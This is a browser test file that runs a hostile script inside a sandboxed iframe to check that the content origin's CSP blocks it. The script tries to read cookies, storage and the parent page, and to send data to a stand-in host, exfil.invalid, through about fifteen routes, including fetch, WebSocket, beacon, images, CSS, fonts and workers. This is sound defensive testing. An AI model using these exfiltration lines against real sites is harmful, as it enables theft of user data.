import { afterEach, describe, expect, it } from 'vitest'
// The policy the server sends with every page (kept equal by a Go test).
import served from '../../../../../backend/internal/application/htmlpage/testdata/content-csp.txt?raw'

/**
 * Hostile pages run in a real browser under the frame the viewer makes
 * (sandbox="allow-scripts") and the policy the content origin serves (ADR 0052).
 * A page cannot set `sandbox` or `frame-ancestors` in a meta tag, so those two
 * are the frame's attribute and the server's header; the rest is the same text.
 */
const policy = served
  .trim()
  .split(';')
  .map((directive) => directive.trim())
  .filter(
    (directive) => directive && !/^(sandbox|frame-ancestors)\b/.test(directive)
  )
  .join('; ')

const frames: HTMLIFrameElement[] = []
afterEach(() => frames.splice(0).forEach((frame) => frame.remove()))

/** Runs `body` as the page's script and returns what it posted back. */
function run<T>(body: string, withPolicy: boolean): Promise<T> {
  const frame = document.createElement('iframe')
  frame.setAttribute('sandbox', 'allow-scripts')
  frame.srcdoc =
    '<!doctype html><html><head>' +
    (withPolicy
      ? `<meta http-equiv="Content-Security-Policy" content="${policy}">`
      : '') +
    `</head><body><script>${body}</script></body></html>`
  frames.push(frame)
  return new Promise<T>((resolve, reject) => {
    const timer = setTimeout(
      () => reject(new Error('the page never answered')),
      8000
    )
    const listener = (event: MessageEvent) => {
      if (event.source !== frame.contentWindow) return
      clearTimeout(timer)
      window.removeEventListener('message', listener)
      resolve(event.data as T)
    }
    window.addEventListener('message', listener)
    document.body.appendChild(frame)
  })
}

describe('a hostile page in the sandboxed frame', () => {
  it('cannot reach the application: no origin, storage, cookies, parent or navigation', async () => {
    const before = window.location.href
    const result = await run<Record<string, string>>(
      `
      var out = {};
      function attempt(name, fn) { try { var v = fn(); out[name] = v === null || v === undefined ? String(v) : (typeof v === 'object' ? 'object' : String(v)); } catch (e) { out[name] = 'threw ' + e.name; } }
      attempt('origin', function () { return window.origin; });
      attempt('cookie', function () { return document.cookie; });
      attempt('localStorage', function () { return localStorage.length; });
      attempt('sessionStorage', function () { return sessionStorage.length; });
      attempt('parentDocument', function () { return parent.document.title; });
      attempt('parentLocation', function () { return parent.location.href; });
      attempt('topNavigation', function () { top.location.href = 'https://exfil.invalid/?x=1'; return 'assigned'; });
      attempt('popup', function () { return window.open('https://exfil.invalid/'); });
      parent.postMessage(out, '*');
      `,
      false
    )
    expect(result.origin).toBe('null')
    expect(result.cookie).toBe('threw SecurityError')
    expect(result.localStorage).toBe('threw SecurityError')
    expect(result.sessionStorage).toBe('threw SecurityError')
    expect(result.parentDocument).toBe('threw SecurityError')
    expect(result.parentLocation).toBe('threw SecurityError')
    expect(result.popup).toBe('null')
    // The assignment may or may not throw, but it never moves the application.
    await new Promise((resolve) => setTimeout(resolve, 300))
    expect(window.location.href).toBe(before)
  })

  it('cannot send anything out: every route is stopped by the policy', async () => {
    const result = await run<{
      violated: string[]
      evalError: string
      dataImage: string
    }>(
      `
      var violated = [];
      document.addEventListener('securitypolicyviolation', function (e) { violated.push(e.effectiveDirective); });
      var out = { violated: violated, evalError: 'none', dataImage: 'unknown' };
      function attempt(fn) { try { fn(); } catch (e) { /* the policy may throw or just report */ } }
      attempt(function () { fetch('https://exfil.invalid/?fetch=1').catch(function () {}); });
      attempt(function () { var x = new XMLHttpRequest(); x.open('GET', 'https://exfil.invalid/?xhr=1'); x.send(); });
      attempt(function () { new WebSocket('wss://exfil.invalid/'); });
      attempt(function () { navigator.sendBeacon('https://exfil.invalid/', 'x'); });
      attempt(function () { new EventSource('https://exfil.invalid/'); });
      attempt(function () { new Image().src = 'https://exfil.invalid/?img=1'; });
      attempt(function () { var d = document.createElement('div'); d.style.backgroundImage = 'url(https://exfil.invalid/?css=1)'; document.body.appendChild(d); });
      attempt(function () { var s = document.createElement('script'); s.src = 'https://exfil.invalid/x.js'; document.head.appendChild(s); });
      attempt(function () { var l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://exfil.invalid/x.css'; document.head.appendChild(l); });
      attempt(function () { var f = document.createElement('iframe'); f.src = 'https://exfil.invalid/'; document.body.appendChild(f); });
      attempt(function () { var o = document.createElement('object'); o.data = 'https://exfil.invalid/x'; document.body.appendChild(o); });
      attempt(function () { var b = document.createElement('base'); b.href = 'https://exfil.invalid/'; document.head.appendChild(b); });
      attempt(function () { new FontFace('x', 'url(https://exfil.invalid/f.woff2)').load().catch(function () {}); });
      attempt(function () { new Worker('https://exfil.invalid/w.js'); });
      try { eval('1+1'); } catch (e) { out.evalError = e.name; }
      var ok = new Image();
      ok.onload = function () { out.dataImage = 'loaded'; };
      ok.onerror = function () { out.dataImage = 'blocked'; };
      ok.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
      setTimeout(function () { parent.postMessage(out, '*'); }, 1200);
      `,
      true
    )
    const expected: Record<string, string[]> = {
      'fetch, XHR, WebSocket, beacon, EventSource': ['connect-src'],
      'image and CSS background': ['img-src'],
      script: ['script-src-elem', 'script-src'],
      stylesheet: ['style-src-elem', 'style-src'],
      frame: ['frame-src'],
      object: ['object-src'],
      base: ['base-uri'],
      font: ['font-src'],
      worker: ['worker-src', 'child-src', 'script-src'],
    }
    for (const [route, directives] of Object.entries(expected)) {
      expect(
        directives.some((directive) => result.violated.includes(directive)),
        `${route} was not stopped by ${directives.join(' or ')}; the policy reported ${[...new Set(result.violated)].join(', ')}`
      ).toBe(true)
    }
    // eval is off, while the page's own inline script and a data: image still work.
    expect(result.evalError).toBe('EvalError')
    expect(result.dataImage).toBe('loaded')
  })
})
